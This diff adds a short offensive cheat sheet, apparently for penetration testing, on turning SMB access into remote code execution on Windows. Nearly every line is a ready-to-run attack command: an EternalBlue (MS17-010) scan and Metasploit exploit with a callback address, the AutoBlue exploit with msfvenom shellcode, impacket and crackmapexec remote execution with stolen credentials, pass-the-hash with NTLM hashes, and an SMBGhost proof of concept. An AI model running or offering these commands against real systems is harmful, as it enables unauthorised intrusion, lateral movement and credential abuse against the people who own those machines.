@@ -1,0 +1,24 @@
+SMB → RCE
+bash# EternalBlue (MS17-010) - Windows 7/Server 2008
+nmap --script smb-vuln-ms17-010 -p445 target
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; set LHOST YOURIP; run"
+
+# Or manual (AutoBlue-MS17-010)
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+python eternalblue_exploit7.py target shellcode/sc_x64_msfvenom.bin
+
+# PSExec style RCE (creds known)
+impacket-psexec user:pass@target
+impacket-wmiexec user:pass@target
+impacket-smbexec user:pass@target
+impacket-atexec user:pass@target "whoami"
+crackmapexec smb target -u user -p pass -x "whoami"
+
+# Pass-the-hash RCE
+impacket-psexec -hashes :NTLM_HASH admin@target
+crackmapexec smb target -u admin -H NTLM_HASH -x "whoami"
+
+# SMBGhost (CVE-2020-0796) - Win10 1903/1909
+git clone https://github.com/ZecOps/CVE-2020-0796-PoC
+python3 CVE-2020-0796-LPE-poc.py  # local
+# RCE version: SMBleedingGhost
